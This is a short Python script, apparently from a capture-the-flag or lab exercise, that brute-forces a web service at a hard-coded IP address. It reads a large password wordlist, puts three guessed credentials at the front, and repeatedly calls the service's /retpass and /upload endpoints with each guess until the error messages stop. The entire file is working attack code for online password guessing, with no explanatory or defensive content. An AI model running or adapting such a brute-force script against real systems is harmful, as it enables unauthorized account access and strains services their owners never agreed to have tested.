import requests

invalid = "Incorrect prepass supplied. "
response = invalid

invalid2 = "Incorrect Password. Goodbye!"
response2 = invalid2

#url = "http://3.135.174.100:6932/retpass?prepass="
#url2 = "http://3.135.174.100:6932/upload?pass=$newpass&payload=test"

with open('/usr/share/wordlists/10-million-password-list-top-10000000.txt') as f:
    l = f.readlines()

for cred in ['dreamer1','BkmuowNTohD5', "overthehill7"]:
    l.insert(0,cred)


i = 0
word=""
while response == invalid and response2 == invalid2:
    word = l[i].strip()
    r = requests.get(f"http://3.135.174.100:6932/retpass?prepass={word}")
    response = r.text
    response2 = requests.get(f"http://3.135.174.100:6932/upload?pass={word}&payload=test").text
    i += 1


print(response)
print(response2)
print(word)
